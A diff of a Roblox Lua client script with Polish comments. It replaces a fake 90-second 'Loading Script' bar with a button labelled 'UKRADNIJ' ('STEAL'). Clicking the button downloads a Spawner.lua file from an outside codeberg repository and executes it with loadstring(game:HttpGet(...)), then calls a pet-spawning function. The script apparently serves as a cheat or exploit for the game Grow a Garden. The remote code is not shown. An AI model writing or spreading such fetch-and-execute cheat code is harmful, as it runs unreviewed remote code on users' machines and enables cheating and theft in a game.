@@ -1,79 +1,59 @@
-local LoadingBar = {}
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
 
-function LoadingBar.Load()
-    local Players = game:GetService("Players")
-    local player = Players.LocalPlayer
-    local playerGui = player:WaitForChild("PlayerGui")
+-- Tworzymy ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SimpleGUI"
+screenGui.Parent = playerGui
 
-    -- ScreenGui
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "LoadingScreen"
-    screenGui.Parent = playerGui
+-- Główne tło GUI
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 200, 0, 100)
+frame.Position = UDim2.new(0.5, -100, 0.5, -50)
+frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+frame.BackgroundTransparency = 0.1
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
 
-    -- Tło prostokąta (szare, półprzezroczyste)
-    local background = Instance.new("Frame")
-    background.Size = UDim2.new(0, 300, 0, 100) -- szerokość 300px, wysokość 100px
-    background.Position = UDim2.new(0.5, -150, 0.5, -50) -- na środku ekranu
-    background.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
-    background.BackgroundTransparency = 0.4
-    background.AnchorPoint = Vector2.new(0, 0)
-    background.BorderSizePixel = 0
-    background.Parent = screenGui
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 10)
+corner.Parent = frame
 
-    -- Zaokrąglone rogi tła
-    local bgUICorner = Instance.new("UICorner")
-    bgUICorner.CornerRadius = UDim.new(0, 10)
-    bgUICorner.Parent = background
+-- Przycisk "UKRADNIJ"
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0, 180, 0, 50)
+button.Position = UDim2.new(0, 10, 0, 25)
+button.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+button.BorderSizePixel = 0
+button.Text = "UKRADNIJ"
+button.TextColor3 = Color3.new(1,1,1)
+button.Font = Enum.Font.GothamBold
+button.TextSize = 24
+button.Parent = frame
 
-    -- Tekst
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(1, 0, 0, 30)
-    label.Position = UDim2.new(0, 0, 0, 10)
-    label.BackgroundTransparency = 1
-    label.Text = "Loading Script - please wait"
-    label.TextColor3 = Color3.new(1, 1, 1)
-    label.Font = Enum.Font.GothamSemibold
-    label.TextSize = 20
-    label.Parent = background
-    label.TextStrokeTransparency = 0.7
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.Parent = button
 
-    -- Pasek ładowania - tło
-    local barBackground = Instance.new("Frame")
-    barBackground.Size = UDim2.new(0.9, 0, 0, 25)
-    barBackground.Position = UDim2.new(0.05, 0, 0, 60)
-    barBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    barBackground.BorderSizePixel = 0
-    barBackground.Parent = background
+-- Funkcja do wykonania po kliknięciu
+button.MouseButton1Click:Connect(function()
+    -- Disable button chwilowo, aby nie spamować
+    button.Text = "Ładuję..."
+    button.Active = false
 
-    local barUICorner = Instance.new("UICorner")
-    barUICorner.CornerRadius = UDim.new(0, 12)
-    barUICorner.Parent = barBackground
+    local success, err = pcall(function()
+        local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+        Spawner.SpawnPet("Raccoon", 1, 2)
+    end)
 
-    -- Pasek ładowania - wypełnienie
-    local fill = Instance.new("Frame")
-    fill.Size = UDim2.new(0, 0, 1, 0) -- zaczynamy od 0 szerokości
-    fill.BackgroundColor3 = Color3.fromRGB(0, 170, 255) -- niebieski, estetyczny kolor
-    fill.BorderSizePixel = 0
-    fill.Parent = barBackground
-
-    local fillUICorner = Instance.new("UICorner")
-    fillUICorner.CornerRadius = UDim.new(0, 12)
-    fillUICorner.Parent = fill
-
-    -- Animacja ładowania (1.5 minuty = 90 sekund)
-    local duration = 90
-    local step = 0.05
-    local elapsed = 0
-
-    while elapsed < duration do
-        elapsed = elapsed + step
-        local progress = math.clamp(elapsed / duration, 0, 1)
-        fill.Size = UDim2.new(progress, 0, 1, 0)
-        wait(step)
+    if success then
+        button.Text = "Sukces!"
+    else
+        button.Text = "Błąd: "..tostring(err)
     end
 
-    -- Po zakończeniu usuń GUI
-    screenGui:Destroy()
-end
-
-return LoadingBar
+    wait(3)
+    button.Text = "UKRADNIJ"
+    button.Active = true
+end)
